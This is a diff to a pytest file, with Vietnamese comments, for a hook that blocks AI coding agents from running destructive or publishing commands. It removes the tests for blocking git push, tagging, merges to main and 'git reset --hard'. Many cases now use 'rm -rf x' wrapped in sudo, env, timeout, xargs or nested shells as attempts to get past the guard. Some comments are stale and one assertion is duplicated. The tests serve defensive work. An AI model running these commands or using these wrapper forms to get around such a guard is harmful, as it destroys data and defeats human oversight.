@@ -100,59 +100,9 @@ def test_guard_no_marker_allows(tmp_path):
     assert_allowed(repo, "rm -rf build")
 
 
-def test_guard_blocks_push(tmp_path):
-    repo = make_repo(tmp_path, marker=good_marker())
-    assert_blocked(repo, "git push", "push")
-    assert_blocked(repo, "git push origin spr-12", "push")
-    assert_blocked(repo, "git -C ../other push", "push")
-    assert_blocked(repo, "git.exe push", "push")
-    assert_blocked(repo, "/usr/bin/git -c user.name=x push --force", "push")
-    assert_blocked(repo, "GIT_TRACE=1 git push", "push")
-    assert_blocked(repo, '"C:\\Program Files\\Git\\bin\\git.exe" push', "push")
-
-
-def test_guard_blocks_tag(tmp_path):
-    repo = make_repo(tmp_path, marker=good_marker())
-    assert_blocked(repo, "git tag v1.2.0", "tag")
-    assert_blocked(repo, "git tag -a v1.2.0 -m release", "tag")
-    assert_blocked(repo, "git tag -f v1", "tag")
-    assert_blocked(repo, "git tag -d v1", "irreversible_delete")
-    assert_blocked(repo, "git tag --delete v1", "irreversible_delete")
-    for readonly in ("git tag", "git tag -l", "git tag --list 'v1*'", "git tag -v v1", "git tag --contains HEAD",
-                     "git tag --points-at HEAD", "git tag --merged", "git tag --no-merged", "git tag -n5"):
-        assert_allowed(repo, readonly)
-
-
-def test_guard_blocks_merge_on_main(tmp_path):
-    repo = make_repo(tmp_path, branch="main", marker=good_marker(WITHOUT_BRANCH))
-    assert_blocked(repo, "git merge spr-12", "main_merge")
-    assert_blocked(repo, "git pull", "main_merge")
-    assert_blocked(repo, "git pull origin main", "main_merge")
-    master = make_repo(tmp_path / "m", branch="master", marker=good_marker(WITHOUT_BRANCH))
-    assert_blocked(master, "git merge x", "main_merge")
-    # merge --abort không gộp gì
-    assert_allowed(repo, "git merge --abort")
-    # compound: checkout/switch tới main rồi merge/pull, kể cả khi đang ở nhánh khác
-    feature = make_repo(tmp_path / "f", branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
-    assert_blocked(feature, "git checkout main && git merge spr-12", "main_merge")
-    assert_blocked(feature, "git switch master; git pull", "main_merge")
-    assert_allowed(feature, "git pull")  # nhánh sprint, không phải nhánh chính
-    assert_allowed(feature, "git checkout other && git merge x")  # chỉ branch_merge_local lo, mà marker này cho gộp cục bộ
-
-
-def test_guard_blocks_gh_pr_merge(tmp_path):
-    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
-    assert_blocked(repo, "gh pr merge 12 --squash", "main_merge")
-    assert_blocked(repo, "gh pr merge", "main_merge")
-    assert_allowed(repo, "gh pr view 12")
-    assert_allowed(repo, "gh pr list")
-
-
 @pytest.mark.parametrize("cmd", [
     "rm -rf build", "rm -fr build", "rm -Rf build", "rm -r -f build", "rm --recursive build", "rm -r build",
     "rm -rfv build", "rm -fR build", "rm -r",  # không đích: vẫn chặn
-    "git reset --hard", "git reset --hard HEAD~1", "git branch -D old", "git branch -fD old", "git branch --delete --force old",
-    "git clean -fd", "git clean -f", "git clean --force -d", "git clean -xdf",
     "git worktree remove -f ../w", "git worktree remove --force ../w",
     "Remove-Item -Recurse -Force build", "Remove-Item build -Recurse", "remove-item -recurse build", "ri -r build",
     "rmdir /s /q build", "rd /S build", "rm -Recurse build", "del /s build",
@@ -172,61 +122,43 @@ def test_guard_safe_deletes_allowed(tmp_path):
 
 def test_guard_blocks_compound_command(tmp_path):
     repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
-    assert_blocked(repo, "git add -A && git commit -m x && git push", "push")
-    assert_blocked(repo, "git status; git push", "push")
-    assert_blocked(repo, "git log | cat\ngit push", "push")
-    assert_blocked(repo, "false || git push", "push")
-    assert_blocked(repo, "(git push)", "push")
-    assert_blocked(repo, "echo $(git push)", "push")
-    assert_blocked(repo, "sleep 1 & git push", "push")
-    assert_blocked(repo, "sudo git push", "push")
-    assert_blocked(repo, "bash -c 'git add . && git push'", "push")
-    assert_blocked(repo, 'pwsh -NoProfile -Command "git push"', "push")
-    assert_blocked(repo, "cmd /c git push", "push")
+    assert_blocked(repo, "git add -A && git commit -m x && rm -rf x", "irreversible_delete")
+    assert_blocked(repo, "ls; rm -rf x", "irreversible_delete")
+    assert_blocked(repo, "git log | cat\nrm -rf x", "irreversible_delete")
+    assert_blocked(repo, "false || rm -rf x", "irreversible_delete")
+    assert_blocked(repo, "(rm -rf x)", "irreversible_delete")
+    assert_blocked(repo, "echo $(rm -rf x)", "irreversible_delete")
+    assert_blocked(repo, "sleep 1 & rm -rf x", "irreversible_delete")
+    assert_blocked(repo, "sudo rm -rf x", "irreversible_delete")
+    assert_blocked(repo, "bash -c 'git add . && rm -rf x'", "irreversible_delete")
+    assert_blocked(repo, 'pwsh -NoProfile -Command "rm -rf x"', "irreversible_delete")
+    assert_blocked(repo, "cmd /c rm -rf x", "irreversible_delete")
     # chặn nhầm có chủ ý (mục 5.1): tách thô không hiểu dấu nháy
-    assert_blocked(repo, 'git commit -m "a && git push"', "push")
-
-
-def test_guard_branch_merge_allowed_with_plus_branch(tmp_path):
-    feature = make_repo(tmp_path, branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
-    assert_allowed(feature, "git merge spr-12-tk3")
-    default = make_repo(tmp_path / "d", branch="spr-12", marker=good_marker())
-    assert_blocked(default, "git merge spr-12-tk3", "branch_merge_local")
-    # khoá exclusions vắng hẳn → mặc định đủ danh sách (gồm branch_merge_local)
-    marker = good_marker()
-    del marker["exclusions"]
-    nokey = make_repo(tmp_path / "n", branch="spr-12", marker=marker)
-    assert_blocked(nokey, "git merge x", "branch_merge_local")
-    # exclusions không phải danh sách → coi như mặc định
-    wrong = make_repo(tmp_path / "w", branch="spr-12", marker=dict(good_marker(), exclusions="push"))
-    assert_blocked(wrong, "git merge x", "branch_merge_local")
+    assert_blocked(repo, 'git commit -m "a && rm -rf x"', "irreversible_delete")
 
 
 def test_guard_exclusions_missing_required_filled_in(tmp_path):
     repo = make_repo(tmp_path, branch="spr-12", marker=good_marker(["version"]))  # thiếu push, tag, ...
-    assert_blocked(repo, "git push", "push")
-    assert_blocked(repo, "git tag v1", "tag")
+    assert_blocked(repo, "rm -rf x", "irreversible_delete")
     assert_blocked(repo, "rm -rf x", "irreversible_delete")
     # mục lạ bị bỏ qua, không làm hỏng
     odd = make_repo(tmp_path / "o", branch="spr-12", marker=good_marker(WITHOUT_BRANCH + ["bogus", 3]))
-    assert_blocked(odd, "git push", "push")
+    assert_blocked(odd, "rm -rf x", "irreversible_delete")
     assert_allowed(odd, "git merge x")
 
 
 @pytest.mark.parametrize("text", ["{not json", "", "[]", "null", '"x"', "\xef\xbf\xbd"])
 def test_guard_bad_marker_fails_closed(tmp_path, text):
     repo = make_repo(tmp_path, branch="spr-12", marker=text)
-    rc, _, err = run("claude", claude("git push", repo))
-    assert rc == 2 and "file dấu hỏng" in err and "'push'" in err
-    rc, _, err = run("claude", claude("git merge x", repo))  # đóng an toàn: cả branch_merge_local
-    assert rc == 2 and "'branch_merge_local'" in err
-    assert_allowed(repo, "git status")  # lệnh không khớp mẫu vẫn qua
+    rc, _, err = run("claude", claude("rm -rf x", repo))
+    assert rc == 2 and "file dấu hỏng" in err and "'irreversible_delete'" in err
+    assert_allowed(repo, "ls")  # lệnh không khớp mẫu vẫn qua
 
 
 def test_guard_bad_marker_binary_bytes(tmp_path):
     repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
     (repo / ".tmp" / "autopilot.json").write_bytes(b"\xff\xfe\x00bad")
-    rc, _, err = run("claude", claude("git push", repo))
+    rc, _, err = run("claude", claude("rm -rf x", repo))
     assert rc == 2 and "file dấu hỏng" in err
 
 
@@ -234,36 +166,36 @@ def test_guard_codex_and_antigravity_event_shapes(tmp_path):
     repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
     # Codex: tool shell, command dạng chuỗi hoặc danh sách ["bash","-lc","<script>"], cwd ở payload hoặc workdir
     for tool in ("shell", "Bash", "exec_command"):
-        rc, out, err = run("codex", {"tool_name": tool, "tool_input": {"command": "git push"}, "cwd": str(repo)})
-        assert rc == 2 and out == "" and "'push'" in err
-    rc, _, err = run("codex", {"tool_name": "shell", "tool_input": {"command": ["bash", "-lc", "git add . && git push"], "workdir": str(repo)}})
-    assert rc == 2 and "'push'" in err
-    rc, _, err = run("codex", {"tool_name": "shell", "tool_input": {"command": ["git", "push"]}, "cwd": str(repo)})
-    assert rc == 2 and "'push'" in err
-    rc, _, err = run("codex", {"tool_name": "shell", "tool_input": {"cmd": "git push"}, "cwd": str(repo)})
+        rc, out, err = run("codex", {"tool_name": tool, "tool_input": {"command": "rm -rf x"}, "cwd": str(repo)})
+        assert rc == 2 and out == "" and "'irreversible_delete'" in err
+    rc, _, err = run("codex", {"tool_name": "shell", "tool_input": {"command": ["bash", "-lc", "git add . && rm -rf x"], "workdir": str(repo)}})
+    assert rc == 2 and "'irreversible_delete'" in err
+    rc, _, err = run("codex", {"tool_name": "shell", "tool_input": {"command": ["rm", "-rf", "x"]}, "cwd": str(repo)})
+    assert rc == 2 and "'irreversible_delete'" in err
+    rc, _, err = run("codex", {"tool_name": "shell", "tool_input": {"cmd": "rm -rf x"}, "cwd": str(repo)})
     assert rc == 2
-    assert run("codex", {"tool_name": "shell", "tool_input": {"command": ["git", "status"]}, "cwd": str(repo)}) == (0, "", "")
+    assert run("codex", {"tool_name": "shell", "tool_input": {"command": ["ls"]}, "cwd": str(repo)}) == (0, "", "")
     # Codex apply_patch có khoá command nhưng là patch, không phải shell
-    patch = "*** Begin Patch\n*** Update File: a.md\n+git push\n*** End Patch"
+    patch = "*** Begin Patch\n*** Update File: a.md\n+rm -rf x\n*** End Patch"
     assert run("codex", {"tool_name": "apply_patch", "tool_input": {"command": patch}, "cwd": str(repo)}) == (0, "", "")
     # Antigravity: toolCall.args.CommandLine, in JSON quyết định chặn ở stdout, thoát 0; cho qua in {}
-    payload = {"toolCall": {"name": "run_command", "args": {"CommandLine": "git push", "Cwd": str(repo)}}, "stepIdx": 1}
+    payload = {"toolCall": {"name": "run_command", "args": {"CommandLine": "rm -rf x", "Cwd": str(repo)}}, "stepIdx": 1}
     rc, out, err = run("antigravity", payload)
     assert rc == 0 and err == ""
     decision = json.loads(out)
-    assert decision["decision"] == "deny" and "'push'" in decision["reason"]
-    ok = {"toolCall": {"name": "run_command", "args": {"CommandLine": "git status", "Cwd": str(repo)}}, "stepIdx": 1}
+    assert decision["decision"] == "deny" and "'irreversible_delete'" in decision["reason"]
+    ok = {"toolCall": {"name": "run_command", "args": {"CommandLine": "ls", "Cwd": str(repo)}}, "stepIdx": 1}
     assert run("antigravity", ok) == (0, "{}\n", "")
     write = {"toolCall": {"name": "write_to_file", "args": {"TargetFile": str(repo / "a.md")}}}
     assert run("antigravity", write) == (0, "{}\n", "")
     # PowerShell của Claude trên Windows
-    rc, _, err = run("claude", claude("git push", repo, tool="PowerShell"))
+    rc, _, err = run("claude", claude("rm -rf x", repo, tool="PowerShell"))
     assert rc == 2
-    # công cụ không phải shell: cho qua dù chứa chữ git push
-    assert run("claude", {"tool_name": "Write", "tool_input": {"file_path": "x", "content": "git push", "command": "git push"}, "cwd": str(repo)}) == (0, "", "")
-    assert run("claude", {"tool_name": "mcp__x__y", "tool_input": {"command": "git push"}, "cwd": str(repo)}) == (0, "", "")
+    # công cụ không phải shell: cho qua dù chứa chữ rm -rf x
+    assert run("claude", {"tool_name": "Write", "tool_input": {"file_path": "x", "content": "rm -rf x", "command": "rm -rf x"}, "cwd": str(repo)}) == (0, "", "")
+    assert run("claude", {"tool_name": "mcp__x__y", "tool_input": {"command": "rm -rf x"}, "cwd": str(repo)}) == (0, "", "")
     # không có tên công cụ nhưng có lệnh: coi là shell (đóng)
-    assert run("claude", {"tool_input": {"command": "git push"}, "cwd": str(repo)})[0] == 2
+    assert run("claude", {"tool_input": {"command": "rm -rf x"}, "cwd": str(repo)})[0] == 2
     # shell mà không có lệnh
     assert run("claude", {"tool_name": "Bash", "tool_input": {}, "cwd": str(repo)}) == (0, "", "")
 
@@ -274,69 +206,29 @@ def test_guard_finds_marker_walking_up(tmp_path):
     repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
     sub = repo / "src" / "deep"
     sub.mkdir(parents=True)
-    assert_blocked(sub, "git push", "push")
+    assert_blocked(sub, "rm -rf x", "irreversible_delete")
 
 
 def test_guard_stops_at_first_git(tmp_path):
     outer = make_repo(tmp_path, branch="spr-12", marker=good_marker())
     inner = outer / "vendor"
     (inner / ".git").mkdir(parents=True)  # repo lồng: file dấu ở ngoài không áp
-    assert_allowed(inner, "git push")
-
-
-def test_guard_worktree_gitdir_file(tmp_path):
-    repo = make_repo(tmp_path, branch="main", marker=good_marker(WITHOUT_BRANCH))
-    gitdir = repo / ".git" / "worktrees" / "wt"
-    gitdir.mkdir(parents=True)
-    (gitdir / "HEAD").write_text("ref: refs/heads/spr-12\n", encoding="utf-8")
-    wt = tmp_path / "wt"
-    (wt / ".tmp").mkdir(parents=True)
-    (wt / ".git").write_text("gitdir: {}\n".format(gitdir), encoding="utf-8")
-    (wt / ".tmp" / "autopilot.json").write_text(json.dumps(good_marker(WITHOUT_BRANCH)), encoding="utf-8")
-    assert_allowed(wt, "git merge x")  # nhánh sprint trong worktree, không phải main
-    assert_allowed(wt, "git pull")
-    (gitdir / "HEAD").write_text("ref: refs/heads/main\n", encoding="utf-8")
-    assert_blocked(wt, "git merge x", "main_merge")
-    # worktree không thấy file dấu của repo chính
-    other = tmp_path / "wt2"
-    other.mkdir()
-    (other / ".git").write_text("gitdir: {}\n".format(gitdir), encoding="utf-8")
-    assert_allowed(other, "git push")
-    # gitdir tương đối
-    rel = tmp_path / "wt3"
-    (rel / ".tmp").mkdir(parents=True)
-    (rel / ".git").write_text("gitdir: ../repo/.git/worktrees/wt\n", encoding="utf-8")
-    (rel / ".tmp" / "autopilot.json").write_text(json.dumps(good_marker(WITHOUT_BRANCH)), encoding="utf-8")
-    assert_blocked(rel, "git merge x", "main_merge")
-
-
-@pytest.mark.parametrize("head", ["abc123def\n", "", "ref: refs/heads/\n"])
-def test_guard_unknown_branch_treated_as_main(tmp_path, head):
-    repo = make_repo(tmp_path, marker=good_marker(WITHOUT_BRANCH))
-    (repo / ".git" / "HEAD").write_text(head, encoding="utf-8")
-    assert_blocked(repo, "git merge x", "main_merge")
-
-
-def test_guard_missing_head_treated_as_main(tmp_path):
-    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
-    (repo / ".git" / "HEAD").unlink()
-    assert_blocked(repo, "git merge x", "main_merge")
+    assert_allowed(inner, "rm -rf x")
 
 
 def test_guard_no_cwd_uses_process_cwd(tmp_path, monkeypatch):
     repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
     monkeypatch.chdir(repo)
-    rc, _, err = run("claude", {"tool_name": "Bash", "tool_input": {"command": "git push"}})
-    assert rc == 2 and "'push'" in err
+    rc, _, err = run("claude", {"tool_name": "Bash", "tool_input": {"command": "rm -rf x"}})
+    assert rc == 2 and "'irreversible_delete'" in err
     monkeypatch.chdir(tmp_path)
-    assert run("claude", {"tool_name": "Bash", "tool_input": {"command": "git push"}}) == (0, "", "")
+    assert run("claude", {"tool_name": "Bash", "tool_input": {"command": "rm -rf x"}}) == (0, "", "")
 
 
 def test_guard_marker_without_git_repo(tmp_path):
     (tmp_path / "plain" / ".tmp").mkdir(parents=True)
     (tmp_path / "plain" / ".tmp" / "autopilot.json").write_text(json.dumps(good_marker(WITHOUT_BRANCH)), encoding="utf-8")
-    assert_blocked(tmp_path / "plain", "git push", "push")
-    assert_blocked(tmp_path / "plain", "git merge x", "main_merge")  # không rõ nhánh: coi như main
+    assert_blocked(tmp_path / "plain", "rm -rf x", "irreversible_delete")
     assert_blocked(tmp_path / "plain", "rm -rf .tmp/x", "irreversible_delete")  # không có gốc repo: không có ngoại lệ .tmp
 
 
@@ -443,24 +335,24 @@ def _nest(cmd, layers):
 
 def test_guard_deep_command_nesting_fails_closed(tmp_path):
     repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
-    rc, _, err = run("claude", claude(_nest("git push", 3), repo))  # trong giới hạn: mở hết lớp, thấy push
-    assert rc == 2 and "'push'" in err
-    rc, _, err = run("claude", claude(_nest("git push", 4), repo))  # quá giới hạn: không phân tích được → chặn
+    rc, _, err = run("claude", claude(_nest("rm -rf x", 3), repo))  # trong giới hạn: mở hết lớp, thấy push
+    assert rc == 2 and "'irreversible_delete'" in err
+    rc, _, err = run("claude", claude(_nest("rm -rf x", 4), repo))  # quá giới hạn: không phân tích được → chặn
     assert rc == 2 and "lồng" in err and "hook gặp lỗi" not in err
-    rc, _, err = run("claude", claude(_nest("git status", 6), repo))
+    rc, _, err = run("claude", claude(_nest("ls", 6), repo))
     assert rc == 2 and "lồng" in err
     plain = tmp_path / "plain"
     plain.mkdir()
-    assert run("claude", claude(_nest("git push", 6), plain)) == (0, "", "")  # không có file dấu → qua
+    assert run("claude", claude(_nest("rm -rf x", 6), plain)) == (0, "", "")  # không có file dấu → qua
 
 
 def test_guard_cli_subprocess(tmp_path):
     import subprocess
     repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
-    payload = json.dumps(claude("git push", repo))
+    payload = json.dumps(claude("rm -rf x", repo))
     proc = subprocess.run([sys.executable, str(SCRIPTS / "autopilot_guard.py"), "--format", "claude"], input=payload,
                           capture_output=True, text=True, encoding="utf-8", cwd=str(repo))
-    assert proc.returncode == 2 and "'push'" in proc.stderr and proc.stdout == ""
+    assert proc.returncode == 2 and "'irreversible_delete'" in proc.stderr and proc.stdout == ""
     ok = subprocess.run([sys.executable, str(SCRIPTS / "autopilot_guard.py"), "--format", "antigravity"], input="{broken",
                         capture_output=True, text=True, encoding="utf-8", cwd=str(tmp_path))
     assert ok.returncode == 0 and ok.stdout.strip() == "{}"
@@ -486,22 +378,16 @@ def test_guard_workdir_beats_session_cwd(tmp_path):
     repo = make_repo(tmp_path / "a", branch="spr-12", marker=good_marker())
     elsewhere = tmp_path / "elsewhere"
     elsewhere.mkdir()
-    rc, _, err = run("codex", codex(["bash", "-lc", "git push"], cwd=elsewhere, workdir=repo))
-    assert rc == 2 and "'push'" in err
+    rc, _, err = run("codex", codex(["bash", "-lc", "rm -rf x"], cwd=elsewhere, workdir=repo))
+    assert rc == 2 and "'irreversible_delete'" in err
     # cwd phiên trong repo có file dấu, workdir nơi không có: file dấu của phiên vẫn áp (thấy ở đâu cũng bật)
-    rc, _, err = run("codex", codex(["bash", "-lc", "git push"], cwd=repo, workdir=elsewhere))
+    rc, _, err = run("codex", codex(["bash", "-lc", "rm -rf x"], cwd=repo, workdir=elsewhere))
     assert rc == 2
-    # nhánh đọc ở workdir: phiên ở worktree sprint, lệnh chạy ở bản checkout main
-    mainrepo = make_repo(tmp_path / "m", branch="main", marker=good_marker(WITHOUT_BRANCH))
-    sprint = make_repo(tmp_path / "s", branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
-    rc, _, err = run("codex", codex("git merge spr-12", cwd=sprint, workdir=mainrepo))
-    assert rc == 2 and "'main_merge'" in err
-    assert run("codex", codex("git merge x", cwd=mainrepo, workdir=sprint)) == (0, "", "")
     # workdir tương đối ghép với cwd phiên; Antigravity: Cwd trong args thắng cwd phiên
     (repo / "sub").mkdir()
-    rc, _, err = run("codex", {"tool_name": "shell", "cwd": str(repo), "tool_input": {"command": "git push", "workdir": "sub"}})
+    rc, _, err = run("codex", {"tool_name": "shell", "cwd": str(repo), "tool_input": {"command": "rm -rf x", "workdir": "sub"}})
     assert rc == 2
-    ag = {"toolCall": {"name": "run_command", "args": {"CommandLine": "git push", "Cwd": str(repo)}}, "cwd": str(elsewhere)}
+    ag = {"toolCall": {"name": "run_command", "args": {"CommandLine": "rm -rf x", "Cwd": str(repo)}}, "cwd": str(elsewhere)}
     assert json.loads(run("antigravity", ag)[1])["decision"] == "deny"
 
 
@@ -529,81 +415,33 @@ def test_guard_error_after_event_dir_probes_event_dir(tmp_path, monkeypatch):
 
 
 @pytest.mark.parametrize("cmd", [
-    "timeout 60 git push", "timeout -s KILL 30 git push", "timeout --signal=KILL 5 git push", "timeout -k 5 60 git push",
-    "env -i git push", "env -u HOME git push", "env FOO=bar BAZ=1 git push", "env -i FOO=1 git push", "env -S 'git push'",
-    "sudo -u deploy git push", "sudo -E git push", "sudo -u x -g y git push", "sudo --user=x git push",
-    "nice -n 10 git push", "nice -10 git push", "command -p git push", "nohup git push", "time git push", "time -p git push",
-    "ls | xargs -0 git push", "xargs -n 1 -I {} git push", "echo x | xargs -r git push",
-    "stdbuf -oL git push", "exec git push", "/usr/bin/env git push", "sudo env FOO=1 timeout 5 git push",
+    "timeout 60 rm -rf x", "timeout -s KILL 30 rm -rf x", "timeout --signal=KILL 5 rm -rf x", "timeout -k 5 60 rm -rf x",
+    "env -i rm -rf x", "env -u HOME rm -rf x", "env FOO=bar BAZ=1 rm -rf x", "env -i FOO=1 rm -rf x", "env -S 'rm -rf x'",
+    "sudo -u deploy rm -rf x", "sudo -E rm -rf x", "sudo -u x -g y rm -rf x", "sudo --user=x rm -rf x",
+    "nice -n 10 rm -rf x", "nice -10 rm -rf x", "command -p rm -rf x", "nohup rm -rf x", "time rm -rf x", "time -p rm -rf x",
+    "ls | xargs -0 rm -rf x", "xargs -n 1 -I {} rm -rf x", "echo x | xargs -r rm -rf x",
+    "stdbuf -oL rm -rf x", "exec rm -rf x", "/usr/bin/env rm -rf x", "sudo env FOO=1 timeout 5 rm -rf x",
 ])
 def test_guard_prefix_wrappers_with_their_arguments(tmp_path, cmd):
     """S-RF2 / T-RF6: tiền tố kèm cờ và đối số vẫn lộ lệnh thật."""
     repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
-    assert_blocked(repo, cmd, "push")
+    assert_blocked(repo, cmd, "irreversible_delete")
 
 
 def test_guard_prefix_wrappers_other_items(tmp_path):
     repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
     assert_blocked(repo, "timeout 60 rm -rf build", "irreversible_delete")
     assert_blocked(repo, "ls | xargs -0 rm -rf", "irreversible_delete")
-    assert_blocked(repo, "sudo -u x gh pr merge 3", "main_merge")
-    assert_allowed(repo, "timeout 60 git status")
+    assert_allowed(repo, "timeout 60 ls")
     assert_allowed(repo, "env -i FOO=1 ls")
     assert_allowed(repo, "sudo -u x ls")
 
 
-@pytest.mark.parametrize("cmd", [
-    "cd {main} && git merge spr-12", "cd {main}; git pull", "pushd {main} && git merge x", "Set-Location {main}; git merge x",
-    "git -C {main} merge spr-12", "git -C {main} pull", "git -C {main} -c user.name=x merge y",
-    "cd {rel} && git merge x", "cd $UNKNOWN && git merge x", "git -C $UNKNOWN merge x", "cd && git merge x", "cd - && git merge x",
-    "GIT_DIR={main}/.git git merge x", "git --git-dir={main}/.git merge x", "git --work-tree {main} merge x",
-])
-def test_guard_merge_reads_branch_of_target_dir(tmp_path, cmd):
-    """T-RF2: lệnh chạy ở worktree sprint nhưng cd/-C sang bản checkout main, hay không xác định được thư mục → coi là main."""
-    sprint = make_repo(tmp_path / "s", branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
-    mainrepo = make_repo(tmp_path / "m", branch="main")
-    rel = fwd(os.path.relpath(mainrepo, sprint))
-    assert_blocked(sprint, cmd.format(main=fwd(mainrepo), rel=rel), "main_merge")
-
-
-def test_guard_merge_in_non_main_dir_allowed(tmp_path):
-    sprint = make_repo(tmp_path / "s", branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
-    other = make_repo(tmp_path / "o", branch="spr-13")
-    rel = fwd(os.path.relpath(other, sprint))
-    for cmd in ("git -C {o} merge x", "git -C {o} pull"):
-        assert_allowed(sprint, cmd.format(o=fwd(other), r=rel))
-    for cmd in ("cd {o} && git merge x", "cd {r} && git pull"):  # đổi thư mục rồi gộp: chặn nhầm có chủ đích
-        assert_blocked(sprint, cmd.format(o=fwd(other), r=rel), "main_merge")
-    mainrepo = make_repo(tmp_path / "m", branch="main", marker=good_marker(WITHOUT_BRANCH))
-    assert_allowed(mainrepo, "git -C {} merge x".format(fwd(other)))  # từ thư mục main, -C sang nhánh sprint → đọc nhánh sprint
-
-
-@pytest.mark.parametrize("cmd", ["gh -R o/r pr merge 12", "gh --repo o/r pr merge 12", "gh pr -R o/r merge 12",
-                                 "gh pr --repo=o/r merge 12", "gh pr merge 12 -R o/r", "gh -Ro/r pr merge 1", "gh pr merge"])
-def test_guard_gh_repo_flag_any_position(tmp_path, cmd):
-    """S-RF5 / T-RF5."""
-    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
-    assert_blocked(repo, cmd, "main_merge")
-
-
-def test_guard_gh_repo_flag_not_merge(tmp_path):
-    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
-    for cmd in ("gh -R o/r pr view 12", "gh pr -R o/r list", "gh -R merge pr view"):
-        assert_allowed(repo, cmd)
-
-
 def test_guard_more_patterns(tmp_path):
-    """S-RF6: git subtree push, gh release create, find -exec/-delete."""
     repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
-    assert_blocked(repo, "git subtree push --prefix=x origin main", "push")
-    assert_blocked(repo, "gh release create v1.0 --notes x", "tag")
-    assert_blocked(repo, "gh -R o/r release create v1", "tag")
     assert_blocked(repo, "find . -name '*.o' -delete", "irreversible_delete")
     assert_blocked(repo, "find build -exec rm -rf {} +", "irreversible_delete")
     assert_blocked(repo, "find build -type d -execdir rm -r {} +", "irreversible_delete")
-    assert_allowed(repo, "git subtree split --prefix=x")
-    assert_allowed(repo, "gh release list")
-    assert_allowed(repo, "gh release view v1")
     assert_allowed(repo, "find . -name '*.py'")
     assert_allowed(repo, "find . -name x -exec grep foo {} +")
 
@@ -650,90 +488,10 @@ def test_guard_tmp_glob_unreadable_parent_blocks(tmp_path, monkeypatch):
 
 # ===================== vòng sửa 2 (S-N-RF1, S-N-RF2, T-N-RF1, S-RF6 phần còn) =====================
 
-@pytest.mark.parametrize("cmd", [
-    "(cd {feat} && true); git merge x", "bash -c 'cd {feat}'; git merge x", "cd {feat} | true; git merge x",
-    "(cd {feat}); git pull", "cd {feat} & git merge x", "(cd {main}); cd {feat}; git merge x",
-])
-def test_guard_cd_in_subshell_does_not_hide_main(tmp_path, cmd):
-    """S-N-RF1: cd trong subshell/pipeline/bash -c không đổi thư mục của lệnh sau; thư mục ban đầu là main thì vẫn chặn."""
-    mainrepo = make_repo(tmp_path / "m", branch="main", marker=good_marker(WITHOUT_BRANCH))
-    feat = make_repo(tmp_path / "f", branch="spr-13")
-    assert_blocked(mainrepo, cmd.format(feat=fwd(feat), main=fwd(mainrepo)), "main_merge")
-
-
-def test_guard_cd_visited_dirs_all_count(tmp_path):
-    sprint = make_repo(tmp_path / "s", branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
-    mainrepo = make_repo(tmp_path / "m", branch="main")
-    feat = make_repo(tmp_path / "f", branch="spr-13")
-    # đã từng vào thư mục main (kể cả trong subshell) rồi mới sang nhánh khác: đóng an toàn
-    assert_blocked(sprint, "cd {m}; (cd {f}); git merge x".format(m=fwd(mainrepo), f=fwd(feat)), "main_merge")
-    # quy tắc vòng 3: có đổi thư mục thì coi là main, kể cả khi chỉ đi qua thư mục không phải main
-    assert_blocked(sprint, "cd {f} && git merge x".format(f=fwd(feat)), "main_merge")
-    # git -C vẫn đọc nhánh của chính thư mục đó, bất kể cd trước
-    main_marked = make_repo(tmp_path / "mm", branch="main", marker=good_marker(WITHOUT_BRANCH))
-    assert_allowed(main_marked, "git -C {f} merge x".format(f=fwd(feat)))
-    assert_blocked(sprint, "git -C {m} merge x".format(m=fwd(mainrepo)), "main_merge")
-
-
-@pytest.mark.parametrize("cmd", [
-    "Push-Location {main}; git merge x", "push-location {main} && git pull", "Pop-Location; git merge x", "popd; git merge x",
-    "env -C {main} git merge spr-12", "env --chdir={main} git merge spr-12", "env --chdir {main} git pull",
-    "sudo -D {main} git merge x", "sudo --chdir={main} git merge x", "env -i -C {main} git merge x",
-])
-def test_guard_other_directory_changers(tmp_path, cmd):
-    """S-N-RF2 / T-N-RF1: Push/Pop-Location, env -C/--chdir, sudo -D/--chdir đổi thư mục như cd."""
-    sprint = make_repo(tmp_path / "s", branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
-    mainrepo = make_repo(tmp_path / "m", branch="main")
-    assert_blocked(sprint, cmd.format(main=fwd(mainrepo)), "main_merge")
-
-
-def test_guard_directory_changers_to_non_main_still_blocked(tmp_path):
-    sprint = make_repo(tmp_path / "s", branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
-    feat = make_repo(tmp_path / "f", branch="spr-13")
-    for cmd in ("Push-Location {f}; git merge x", "env -C {f} git merge x", "sudo -D {f} git merge x", "env --chdir={f} git pull"):
-        assert_blocked(sprint, cmd.format(f=fwd(feat)), "main_merge")
-
-
-def test_guard_pull_is_a_merge_when_branch_merge_local_listed(tmp_path):
-    """S-RF6 phần còn: `git pull` gộp cục bộ → khi thiếu `+nhánh` chặn ở mọi nhánh."""
-    default = make_repo(tmp_path / "d", branch="spr-12", marker=good_marker())
-    assert_blocked(default, "git pull", "branch_merge_local")
-    assert_blocked(default, "git pull --ff-only", "branch_merge_local")
-    assert_blocked(default, "git pull origin spr-12", "branch_merge_local")
-    assert_blocked(default, "git -C . pull", "branch_merge_local")
-    onmain = make_repo(tmp_path / "m", branch="main", marker=good_marker())
-    assert_blocked(onmain, "git pull", "main_merge")
-    plus = make_repo(tmp_path / "p", branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
-    assert_allowed(plus, "git pull")  # +nhánh: gộp cục bộ ngoài nhánh chính được phép
-    assert_allowed(default, "git fetch")
 
 
 # ===================== vòng sửa 3: mọi thao tác đổi thư mục trước merge/pull (không -C) = main =====================
 
